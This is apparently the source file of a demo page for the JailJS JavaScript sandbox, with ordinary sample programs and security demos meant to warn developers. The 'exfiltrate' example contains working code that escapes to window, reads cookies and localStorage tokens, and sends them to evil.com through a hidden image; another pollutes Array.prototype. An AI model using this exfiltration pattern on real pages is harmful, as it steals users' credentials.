import { Interpreter, parse } from "@mariozechner/jailjs";
import { transformToES5 } from "@mariozechner/jailjs/transform";

interface Example {
   code: string;
   getScope: () => Record<string, any>;
   renderExplainer?: () => void;
   cleanupExplainer?: () => void;
}

// Set up demo localStorage data for security demonstration
localStorage.setItem("apiKey", "demo_key_1234567890abcdefghijklmnop");
localStorage.setItem("sessionToken", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.example");
localStorage.setItem("userEmail", "user@example.com");

// Base scope used by most examples
const getBaseScope = () => ({
   console: {
      log: (...args: any[]) => console.log("[Sandbox]", ...args),
   },
   Math: Math,
   JSON: JSON,
   Date: Date,
   Object: Object,
   Array: Array,
   setTimeout: setTimeout,
   alert: alert,
});

// Create proxied document that blocks window access
const createProxiedDocument = () => {
   return new Proxy(document, {
      get(target, prop) {
         // Block known escape routes to window
         if (prop === "defaultView" || prop === "ownerDocument") {
            return undefined;
         }
         const value = (target as any)[prop];
         // If it's a function, bind it to the target to preserve context
         if (typeof value === "function") {
            return value.bind(target);
         }
         return value;
      },
   });
};

const examples: Record<string, Example> = {
   fibonacci: {
      code: `var fibonacci = function(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
};

fibonacci(10)`,
      getScope: getBaseScope,
   },

   closure: {
      code: `var makeCounter = function() {
  var count = 0;
  return function() {
    return ++count;
  };
};

var counter = makeCounter();
counter(); // 1
counter(); // 2
counter()  // 3`,
      getScope: getBaseScope,
   },

   array: {
      code: `var numbers = [1, 2, 3, 4, 5];

var doubled = numbers.map(function(x) {
  return x * 2;
});

var evens = doubled.filter(function(x) {
  return x % 2 === 0;
});

evens.reduce(function(sum, x) {
  return sum + x;
}, 0)`,
      getScope: getBaseScope,
   },

   es6: {
      code: `// ES6+ features transformed to ES5
class Counter {
  constructor(start = 0) {
    this.value = start;
  }

  increment() {
    return ++this.value;
  }
}

const counter = new Counter(10);
const numbers = [1, 2, 3];
const doubled = numbers.map(x => x * 2);
const [first, ...rest] = doubled;

JSON.stringify({
  counter: counter.increment(),
  first,
  rest,
  total: [...rest].reduce((a, b) => a + b, 0)
})`,
      getScope: getBaseScope,
   },

   async: {
      code: `// Async/await transformed to ES5
async function fetchData(delay) {
  const result = await new Promise(resolve => {
    setTimeout(() => resolve({ value: 42 }), delay);
  });
  return result.value;
}

async function processData() {
  const x = await fetchData(100);
  const y = await fetchData(50);
  return { x, y, sum: x + y };
}

processData()`,
      getScope: getBaseScope,
   },

   danger: {
      code: `// ⚠️ SECURITY DEMO: Prototype Pollution Attack
// This shows WHY JailJS is NOT safe for LLM/untrusted code!

// Pollute Array.prototype
Array.prototype.HIJACKED = true;

"Prototype polluted! Now click 'Test Attack' below..."`,
      getScope: getBaseScope,
      renderExplainer: () => {
         const explainerDiv = document.getElementById("example-explainer")!;
         explainerDiv.innerHTML = `
            <div class="bg-red-50 rounded-lg p-6 border-2 border-red-300">
               <h2 class="text-sm font-medium text-red-900 mb-2">🚨 Attack Demonstration</h2>
               <p class="text-sm text-red-700 mb-4">The sandboxed code polluted Array.prototype. Now watch what happens when <strong>this app's own code</strong> (outside the sandbox) tries to use arrays:</p>
               <button
                  id="test-attack"
                  class="w-full bg-red-600 hover:bg-red-700 text-white font-medium py-2 px-4 rounded-md transition-colors"
               >Test Attack: Run App's Own Code</button>
               <p class="text-xs text-red-600 mt-3">This demonstrates why you MUST use SandboxJS or isolated workers for LLM/untrusted code!</p>
            </div>
         `;
         explainerDiv.classList.remove("hidden");

         // Attach event listener to the newly created button
         const testAttackButton = document.getElementById("test-attack")!;
         testAttackButton.addEventListener("click", () => {
            if ((Array.prototype as any).HIJACKED) {
               const userData = ["existing-data"];
               alert(
                  "🚨 ATTACK SUCCESSFUL! 🚨\n\n" +
                     `userData array has HIJACKED property: ${(userData as any).HIJACKED}\n\n` +
                     "The sandboxed code polluted Array.prototype, affecting ALL arrays in the app!\n\n" +
                     "In a real attack, the malicious code would hijack push(), map(), etc. to exfiltrate data when your app's code calls these methods.",
               );

               // Clean up
               delete (Array.prototype as any).HIJACKED;
            } else {
               alert("Array.prototype was NOT polluted.\n\nMake sure you clicked 'Execute' on the attack code first!");
            }
         });
      },
      cleanupExplainer: () => {
         const explainerDiv = document.getElementById("example-explainer")!;
         explainerDiv.classList.add("hidden");
      },
   },

   exfiltrate: {
      code: `// ⚠️ SECURITY DEMO: Data Exfiltration Attack
// This shows what happens when you provide raw document!

// 1. Escape to window via document.defaultView
var win = document.defaultView;

// 2. Read sensitive data
var cookies = document.cookie;
var pageTitle = document.title;
var pageContent = document.querySelector('body').innerText;

// 3. Access localStorage via window
var apiKey = win.localStorage.getItem('apiKey');
var sessionToken = win.localStorage.getItem('sessionToken');
var userEmail = win.localStorage.getItem('userEmail');

// 4. Exfiltrate via image tag (check Network tab!)
var exfilURL = 'https://evil.com/?' +
  'c=' + encodeURIComponent(cookies || '') +
  '&k=' + encodeURIComponent(apiKey || '') +
  '&t=' + encodeURIComponent(sessionToken || '') +
  '&e=' + encodeURIComponent(userEmail || '');

var img = document.createElement('img');
img.src = exfilURL;
img.style.display = 'none';
document.body.appendChild(img);

// 5. Show results
"🚨 DATA EXFILTRATED! 🚨\\n\\n" +
"Window access: " + (win ? "SUCCESS via document.defaultView" : "BLOCKED") + "\\n\\n" +
"STOLEN DATA:\\n" +
"Cookies: " + (cookies || "(none)") + "\\n" +
"Page Title: " + pageTitle + "\\n" +
"Page Content: " + pageContent.substring(0, 80) + "...\\n\\n" +
"LOCALSTORAGE (via window):\\n" +
"  apiKey: " + (apiKey || "(not set)") + "\\n" +
"  sessionToken: " + (sessionToken || "(not set)") + "\\n" +
"  userEmail: " + (userEmail || "(not set)") + "\\n\\n" +
"Exfiltration: Check Network tab for request to evil.com\\n\\n" +
"⚠️ Providing raw 'document' gives access to EVERYTHING!"`,
      getScope: () => ({
         ...getBaseScope(),
         document: document, // Raw document with window access
      }),
      renderExplainer: () => {
         const explainerDiv = document.getElementById("example-explainer")!;
         explainerDiv.innerHTML = `
            <div class="bg-red-50 rounded-lg p-4 border-2 border-red-300">
               <h3 class="text-sm font-medium text-red-900 mb-2">⚠️ What this demonstrates:</h3>
               <ul class="text-sm text-red-700 space-y-1 list-disc list-inside">
                  <li><code>document.defaultView</code> gives access to <code>window</code></li>
                  <li><code>window.localStorage</code> exposes stored secrets (API keys, tokens)</li>
                  <li><code>document.cookie</code> reads session cookies</li>
                  <li>Creating <code>&lt;img&gt;</code> tags exfiltrates data via GET request</li>
               </ul>
               <p class="text-xs text-red-600 mt-3"><strong>Never provide raw <code>document</code> to untrusted code!</strong></p>
            </div>
         `;
         explainerDiv.classList.remove("hidden");
      },
      cleanupExplainer: () => {
         const explainerDiv = document.getElementById("example-explainer")!;
         explainerDiv.classList.add("hidden");
      },
   },

   proxyDoc: {
      code: `// ✅ SECURITY DEMO: Proxied document blocks window access

// 1. Try to escape to window via document.defaultView
var win = document.defaultView;  // Returns undefined with proxy!

// 2. Try to access localStorage
var canExfiltrate = false;
try {
  var apiKey = win.localStorage.getItem('apiKey');
  canExfiltrate = true;
} catch(e) {
  // win is undefined, so this will throw
}

// 3. What CAN we still access?
var cookies = document.cookie;
var pageTitle = document.title;
var pageContent = document.querySelector('body').innerText;

// 4. Show results
if (!win) {
  "✅ BLOCKED: document.defaultView returned undefined\\n\\n" +
  "The document was wrapped in a Proxy that blocks:\\n" +
  "  - defaultView (returns undefined)\\n" +
  "  - ownerDocument (returns undefined)\\n\\n" +
  "What's STILL accessible:\\n" +
  "  - Cookies: " + (cookies || "(none)") + "\\n" +
  "  - Page Title: " + pageTitle + "\\n" +
  "  - Page Content: " + pageContent.substring(0, 80) + "...\\n\\n" +
  "Exfiltration blocked: " + (!canExfiltrate ? "✅ YES" : "❌ NO") + "\\n\\n" +
  "⚠️ However, other escape vectors may still exist!\\n" +
  "⚠️ Best practice: Don't provide document to untrusted code.";
} else {
  "🚨 PROXY FAILED: document.defaultView is still accessible!";
}`,
      getScope: () => ({
         ...getBaseScope(),
         document: createProxiedDocument(),
      }),
      renderExplainer: () => {
         const explainerDiv = document.getElementById("example-explainer")!;
         explainerDiv.innerHTML = `
            <div class="bg-green-50 rounded-lg p-4 border-2 border-green-300">
               <h3 class="text-sm font-medium text-green-900 mb-2">✅ User-side protection with Proxy</h3>
               <p class="text-sm text-green-700 mb-2">This example wraps <code>document</code> in a Proxy before passing to JailJS:</p>
               <pre class="text-xs bg-white p-2 rounded border border-green-200 overflow-x-auto mb-2"><code>import { Interpreter, parse } from '@mariozechner/jailjs';

// 1. Create proxied document that blocks window access
const proxiedDoc = new Proxy(document, {
  get(target, prop) {
    if (prop === 'defaultView' || prop === 'ownerDocument') {
      return undefined;
    }
    const value = target[prop];
    return typeof value === 'function' ? value.bind(target) : value;
  }
});

// 2. Pass proxied document to interpreter
const interpreter = new Interpreter({
  document: proxiedDoc,  // Safe(r) - blocks known escapes
  // Instead of: document  // UNSAFE - gives window access
}, { parse });

// 3. Execute untrusted code
const result = interpreter.evaluate(parse(untrustedCode));</code></pre>
               <p class="text-xs text-green-600 mt-2"><strong>Note:</strong> This blocks known escapes but may not catch all attack vectors. Best practice is to not provide DOM access at all for untrusted code.</p>
            </div>
         `;
         explainerDiv.classList.remove("hidden");
      },
      cleanupExplainer: () => {
         const explainerDiv = document.getElementById("example-explainer")!;
         explainerDiv.classList.add("hidden");
      },
   },
};

const codeTextarea = document.getElementById("code") as HTMLTextAreaElement;
const executeButton = document.getElementById("execute") as HTMLButtonElement;
const resultDiv = document.getElementById("result") as HTMLDivElement;
const resultContent = document.getElementById("result-content") as HTMLPreElement;

let currentExample: Example | null = null;

document.querySelectorAll(".example-btn").forEach((btn) => {
   btn.addEventListener("click", () => {
      const name = (btn as HTMLButtonElement).dataset.name;
      if (name && examples[name]) {
         // Cleanup previous example's explainer
         if (currentExample?.cleanupExplainer) {
            currentExample.cleanupExplainer();
         }

         const example = examples[name];
         currentExample = example;

         codeTextarea.value = example.code;
         codeTextarea.focus();

         // Clear result
         resultDiv.classList.add("hidden");

         // Render new explainer
         if (example.renderExplainer) {
            example.renderExplainer();
         }
      }
   });
});

executeButton.addEventListener("click", async () => {
   const code = codeTextarea.value.trim();

   if (!code) {
      showResult("Please enter some code", false);
      return;
   }

   executeButton.disabled = true;
   executeButton.textContent = "Executing...";

   try {
      // Get scope from current example or use base scope
      const scope = currentExample ? currentExample.getScope() : getBaseScope();

      const interpreter = new Interpreter(scope, {
         parse: parse,
         maxOps: 1000000,
      });

      // Transform all code to ES5 (handles both ES5 and ES6+ input)
      const ast = transformToES5(code);
      const result = interpreter.evaluate(ast);

      // Handle promises (from async functions)
      if (result instanceof Promise) {
         const resolvedResult = await result;
         showResult(formatResult(resolvedResult), true);
      } else {
         showResult(formatResult(result), true);
      }
   } catch (error: any) {
      showResult(`Error: ${error.message}\n\n${error.stack || ""}`, false);
   } finally {
      executeButton.disabled = false;
      executeButton.textContent = "Execute";
   }
});

function formatResult(result: any): string {
   if (result === undefined) return "undefined";
   if (result === null) return "null";
   if (typeof result === "string") return result;
   if (typeof result === "object") {
      try {
         return JSON.stringify(result, null, 2);
      } catch {
         return String(result);
      }
   }
   return String(result);
}

function showResult(message: string, success: boolean) {
   resultDiv.classList.remove("hidden");
   resultContent.textContent = message;
   resultContent.className = success
      ? "font-mono text-sm text-green-700 whitespace-pre-wrap break-all"
      : "font-mono text-sm text-red-700 whitespace-pre-wrap break-all";
}

codeTextarea.addEventListener("keydown", (e) => {
   if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) {
      e.preventDefault();
      executeButton.click();
   }
});
